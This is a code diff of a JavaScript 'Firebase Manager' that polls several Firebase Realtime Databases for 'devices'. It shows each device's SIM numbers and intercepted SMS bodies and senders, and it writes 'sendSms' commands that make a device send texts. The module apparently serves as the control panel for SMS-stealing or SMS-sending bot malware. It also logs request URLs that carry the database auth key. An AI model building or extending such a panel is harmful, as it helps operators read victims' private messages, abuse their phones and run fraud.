@@ -1,7 +1,6 @@
 /**
  * FIREBASE MANAGER
- * Handles multiple Firebase connections, data fetching, and real-time updates
- * Reads configs from firebase-configs.json file only
+ * Handles multiple Firebase connections using Realtime Database
  */
 
 // ────────────────────────────────────────────────
@@ -15,21 +14,16 @@ let isInitialized = false;
 let firebaseConfigsCache = null;
 
 // ────────────────────────────────────────────────
-// CONFIG LOADING - FROM JSON FILE ONLY
+// CONFIG LOADING - FROM JSON FILE
 // ────────────────────────────────────────────────
 
-/**
- * Load Firebase configs from JSON file
- */
 async function loadFirebaseConfigs() {
     console.log('📢 Loading Firebase configs from JSON file...');
     try {
-        // Force fresh load from JSON file
         const response = await fetch('data/firebase-configs.json?' + Date.now());
         if (response.ok) {
             const data = await response.json();
             firebaseConfigsCache = data;
-            // Also save to localStorage as backup
             localStorage.setItem('firebase_configs', JSON.stringify(data));
             console.log('✅ Firebase configs loaded from JSON file:', data.sources ? data.sources.length : 0, 'sources');
             return data;
@@ -40,7 +34,6 @@ async function loadFirebaseConfigs() {
         console.log('⚠️ Error loading firebase-configs.json:', e.message);
     }
     
-    // Fallback: try localStorage
     try {
         const data = localStorage.getItem('firebase_configs');
         if (data) {
@@ -59,16 +52,13 @@ async function loadFirebaseConfigs() {
     return { sources: [] };
 }
 
-/**
- * Get all Firebase sources
- */
 async function getAllFirebaseSources() {
     const configs = await loadFirebaseConfigs();
     return configs.sources || [];
 }
 
 // ────────────────────────────────────────────────
-// INITIALIZATION
+// INITIALIZATION - Realtime Database
 // ────────────────────────────────────────────────
 
 async function initFirebaseConnections() {
@@ -115,38 +105,28 @@ async function connectToFirebase(source) {
         console.log(`📢 Connecting to Firebase source: ${id}`);
         console.log(`📢 URL: ${url}`);
 
-        const firebaseConfig = {
-            apiKey: key,
-            authDomain: url.replace('https://', '').replace('.firebaseio.com', '.firebaseapp.com'),
-            databaseURL: url,
-            projectId: url.replace('https://', '').replace('.firebaseio.com', ''),
-            storageBucket: url.replace('https://', '').replace('.firebaseio.com', '.appspot.com'),
-        };
-
-        let app;
-        try {
-            app = firebase.app(id);
-            console.log('📢 Using existing Firebase app');
-        } catch (e) {
-            app = firebase.initializeApp(firebaseConfig, id);
-            console.log('📢 Created new Firebase app');
-        }
-
-        const db = firebase.firestore(app);
-        
-        console.log('📢 Testing Firebase connection...');
-        const testSnapshot = await db.collection('users').limit(1).get();
-        console.log(`📢 Test query returned ${testSnapshot.size} documents`);
-
+        // For Realtime Database, we use the REST API
+        // Store the connection info
         firebaseInstances[id] = {
-            app: app,
-            db: db,
             config: source,
-            connected: true
+            connected: true,
+            url: url,
+            key: key
         };
 
-        console.log(`✅ Connected to Firebase: ${id}`);
-        return true;
+        // Test connection by fetching users
+        const testUrl = `${url}/users.json?auth=${key}&limitToFirst=1`;
+        const response = await fetch(testUrl);
+        
+        if (response.ok) {
+            const data = await response.json();
+            console.log(`📢 Test query returned ${data ? Object.keys(data).length : 0} users`);
+            return true;
+        } else {
+            console.error(`❌ Test failed: ${response.status}`);
+            firebaseInstances[id].connected = false;
+            return false;
+        }
     } catch (error) {
         console.error(`❌ Failed to connect to Firebase ${source.id}:`, error);
         firebaseInstances[source.id] = {
@@ -165,9 +145,6 @@ function disconnectFromFirebase(sourceId) {
                 deviceListeners[sourceId].forEach(unsubscribe => unsubscribe());
                 delete deviceListeners[sourceId];
             }
-            if (firebaseInstances[sourceId].app) {
-                firebaseInstances[sourceId].app.delete();
-            }
             delete firebaseInstances[sourceId];
             console.log(`📢 Disconnected from Firebase: ${sourceId}`);
         }
@@ -177,7 +154,7 @@ function disconnectFromFirebase(sourceId) {
 }
 
 // ────────────────────────────────────────────────
-// DEVICE MANAGEMENT - USING "users" COLLECTION
+// DEVICE MANAGEMENT - Realtime Database
 // ────────────────────────────────────────────────
 
 async function fetchAllDevices() {
@@ -214,25 +191,37 @@ async function fetchDevicesFromSource(sourceId) {
     }
 
     try {
-        console.log(`📢 Querying users collection from ${sourceId}...`);
-        const snapshot = await instance.db.collection('users').get();
+        const { url, key } = instance;
+        
+        // Fetch users from Realtime Database
+        const apiUrl = `${url}/users.json?auth=${key}`;
+        console.log(`📢 Fetching from: ${apiUrl}`);
+        
+        const response = await fetch(apiUrl);
+        
+        if (!response.ok) {
+            throw new Error(`HTTP ${response.status}`);
+        }
+        
+        const data = await response.json();
         const devices = [];
 
-        console.log(`📢 Snapshot size: ${snapshot.size} documents`);
-
-        if (snapshot.empty) {
-            console.log('⚠️ No devices found in users collection');
+        if (!data) {
+            console.log('⚠️ No users found in Realtime Database');
             return [];
         }
 
-        snapshot.forEach(doc => {
-            const data = doc.data();
-            const commandData = data.commands || data;
+        const userIds = Object.keys(data);
+        console.log(`📢 Found ${userIds.length} users in Realtime Database`);
+
+        for (const userId of userIds) {
+            const userData = data[userId];
+            const commandData = userData.commands || userData;
             
             const device = {
-                id: doc.id,
+                id: userId,
                 sourceId: sourceId,
-                name: commandData.body ? commandData.body.substring(0, 20) : doc.id.substring(0, 8),
+                name: commandData.body ? commandData.body.substring(0, 20) : userId.substring(0, 8),
                 number: commandData.number || commandData.to || 'N/A',
                 status: commandData.status === 'pending' ? 'offline' : 'online',
                 battery: 50,
@@ -241,8 +230,7 @@ async function fetchDevicesFromSource(sourceId) {
                 lastSeen: commandData.timestamp ? new Date(commandData.timestamp).toISOString() : new Date().toISOString(),
                 sims: commandData.number ? [commandData.number] : ['N/A'],
                 unread: 0,
-                raw: data,
-                _commandData: commandData,
+                raw: userData,
                 smsBody: commandData.body || commandData.message || commandData.text || '',
                 smsSender: commandData.number || commandData.from || 'Unknown',
                 smsTime: commandData.timestamp ? new Date(commandData.timestamp).toISOString() : new Date().toISOString()
@@ -250,7 +238,7 @@ async function fetchDevicesFromSource(sourceId) {
             
             devices.push(device);
             console.log(`✅ Parsed device: ${device.id.substring(0, 8)}...`);
-        });
+        }
 
         return devices;
     } catch (error) {
@@ -273,25 +261,30 @@ function listenToDevices(callback) {
         if (!instance.connected) continue;
 
         console.log(`📢 Setting up listener for ${sourceId}...`);
-        const unsubscribe = instance.db.collection('users')
-            .onSnapshot((snapshot) => {
-                console.log(`📢 Device update detected in ${sourceId}`);
-                fetchAllDevices().then(() => {
-                    if (callback) callback(allDevices);
-                });
-            }, (error) => {
-                console.error(`❌ Error listening to devices from ${sourceId}:`, error);
-            });
+        
+        // For Realtime Database, we poll every 5 seconds
+        // (Firebase RTDB doesn't have onSnapshot like Firestore)
+        const intervalId = setInterval(async () => {
+            try {
+                const devices = await fetchDevicesFromSource(sourceId);
+                // Update allDevices with this source's data
+                const otherDevices = allDevices.filter(d => d.sourceId !== sourceId);
+                allDevices = [...otherDevices, ...devices];
+                if (callback) callback(allDevices);
+            } catch (error) {
+                console.error(`❌ Error polling devices from ${sourceId}:`, error);
+            }
+        }, 5000);
 
         if (!deviceListeners[sourceId]) {
             deviceListeners[sourceId] = [];
         }
-        deviceListeners[sourceId].push(unsubscribe);
+        deviceListeners[sourceId].push(() => clearInterval(intervalId));
     }
 }
 
 // ────────────────────────────────────────────────
-// SMS MANAGEMENT - USING "users" COLLECTION
+// SMS MANAGEMENT - Realtime Database
 // ────────────────────────────────────────────────
 
 async function fetchSmsForDevice(deviceId, sourceId, simNumber, limit = 100) {
@@ -301,21 +294,26 @@ async function fetchSmsForDevice(deviceId, sourceId, simNumber, limit = 100) {
     }
 
     try {
-        console.log(`📢 Fetching SMS for device: ${deviceId}, SIM: ${simNumber}`);
+        const { url, key } = instance;
+        const apiUrl = `${url}/users/${deviceId}.json?auth=${key}`;
         
-        const doc = await instance.db.collection('users').doc(deviceId).get();
+        const response = await fetch(apiUrl);
         
-        if (!doc.exists) {
-            console.log('⚠️ Device document not found');
+        if (!response.ok) {
+            throw new Error(`HTTP ${response.status}`);
+        }
+        
+        const data = await response.json();
+        
+        if (!data) {
             return [];
         }
         
-        const data = doc.data();
         const commandData = data.commands || data;
         
         if (commandData.action === 'sendSms' || commandData.type === 'sendSms') {
-            const messages = [{
-                id: doc.id,
+            return [{
+                id: deviceId,
                 sender: commandData.number || commandData.from || 'Unknown',
                 body: commandData.body || commandData.message || commandData.text || '',
                 time: commandData.timestamp ? new Date(commandData.timestamp).toISOString() : new Date().toISOString(),
@@ -323,9 +321,6 @@ async function fetchSmsForDevice(deviceId, sourceId, simNumber, limit = 100) {
                 type: commandData.type || 'incoming',
                 raw: commandData
             }];
-            
-            console.log(`📢 Found 1 SMS message`);
-            return messages;
         }
         
         return [];
@@ -344,41 +339,21 @@ function listenToSms(deviceId, sourceId, simNumber, callback) {
 
     console.log(`📢 Setting up SMS listener for device: ${deviceId}, SIM: ${simNumber}`);
 
-    const unsubscribe = instance.db.collection('users').doc(deviceId)
-        .onSnapshot((docSnapshot) => {
-            console.log(`📢 SMS update detected for device: ${deviceId}`);
-            
-            if (!docSnapshot.exists) {
-                if (callback) callback([]);
-                return;
-            }
-            
-            const data = docSnapshot.data();
-            const commandData = data.commands || data;
-            
-            if (commandData.action === 'sendSms' || commandData.type === 'sendSms') {
-                const messages = [{
-                    id: docSnapshot.id,
-                    sender: commandData.number || commandData.from || 'Unknown',
-                    body: commandData.body || commandData.message || commandData.text || '',
-                    time: commandData.timestamp ? new Date(commandData.timestamp).toISOString() : new Date().toISOString(),
-                    simNumber: commandData.number || 'N/A',
-                    type: commandData.type || 'incoming',
-                    raw: commandData
-                }];
-                if (callback) callback(messages);
-            } else {
-                if (callback) callback([]);
-            }
-        }, (error) => {
-            console.error('❌ Error listening to SMS:', error);
-        });
+    // Poll every 3 seconds for SMS updates
+    const intervalId = setInterval(async () => {
+        try {
+            const messages = await fetchSmsForDevice(deviceId, sourceId, simNumber);
+            if (callback) callback(messages);
+        } catch (error) {
+            console.error('❌ Error polling SMS:', error);
+        }
+    }, 3000);
 
-    return unsubscribe;
+    return () => clearInterval(intervalId);
 }
 
 // ────────────────────────────────────────────────
-// SEND SMS - USING "users" COLLECTION
+// SEND SMS - Realtime Database
 // ────────────────────────────────────────────────
 
 async function sendSms(deviceId, sourceId, simNumber, toNumber, message) {
@@ -388,19 +363,19 @@ async function sendSms(deviceId, sourceId, simNumber, toNumber, message) {
     }
 
     try {
-        console.log(`📢 Sending SMS from ${simNumber} to ${toNumber}`);
+        const { url, key } = instance;
         
         const smsData = {
             Action: "sendSms",
             action: "sendSms",
             body: message,
             command: "sendSms",
-            from: simNumber === simNumber ? 1 : 0,
+            from: 1,
             isSended: false,
             message: message,
             number: toNumber,
-            sim: simNumber === simNumber ? 1 : 0,
-            simSlot: simNumber === simNumber ? 1 : 0,
+            sim: 1,
+            simSlot: 1,
             status: "pending",
             text: message,
             timestamp: Date.now(),
@@ -408,11 +383,18 @@ async function sendSms(deviceId, sourceId, simNumber, toNumber, message) {
             type: "sendSms"
         };
 
-        await instance.db.collection('users').doc(deviceId).set({
-            commands: smsData
-        }, { merge: true });
+        const apiUrl = `${url}/users/${deviceId}.json?auth=${key}`;
+        const response = await fetch(apiUrl, {
+            method: 'PATCH',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({ commands: smsData })
+        });
         
-        console.log(`✅ SMS sent successfully`);
+        if (!response.ok) {
+            throw new Error(`HTTP ${response.status}`);
+        }
         
         return {
             success: true,
